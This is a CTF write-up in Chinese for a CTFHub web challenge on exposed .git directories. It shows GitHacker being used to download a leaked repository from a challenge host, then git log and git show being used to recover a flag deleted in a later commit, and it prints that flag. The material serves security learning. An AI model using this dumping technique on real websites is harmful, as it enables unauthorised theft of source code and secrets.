---
title: CTFHub-信息泄露-Git泄露-Log Writeup
date: 2026-09-24
category: Web
tags: [CTFHub, 信息泄露, Git泄露]
---
## 题目简介
考点：Git源码泄露
> 原理：网站服务器配置不当，`.git`文件夹直接对外暴露。`.git`是Git版本仓库，记录所有文件的提交历史。
> 本题网页当前页面只显示 `Where is flag?`，flag在旧版本提交中被写入，之后的提交删除了flag，我们通过下载Git仓库，读取历史提交找回flag。
## 环境与工具
- 系统：Windows
- 工具：GitHacker、Git
- 语言：Python
### 工具安装
cmd
pip install GitHacker
## 解题步骤

1. 下载Git仓库

使用GitHacker抓取目标网站的.git泄露，输出文件夹命名为git_result
githacker --url http://challenge-xxx.ctfhub.com:10080/.git/ --output-folder git_result

2.查看下载出来的文件夹名称
dir git_result
执行后可以看到真实仓库文件夹名aa477d634c45bfe9ef99a161aa92e041

3.进入仓库目录
cd git_result\aa477d634c45bfe9ef99a161aa92e041
查看当前仓库内文件
dir
出现index.html
查看index.html
当前最新文件无flag，flag被删去，需要查看git提交历史

5.git log查看提交历史
git log
找到add flag对应commit id执行
git show 8cb4944e8870473f28538fe88c26eab5ca5e4d83
运行后找到flag

## Flag
ctfhub{db245de63ee40c4d52e23517}

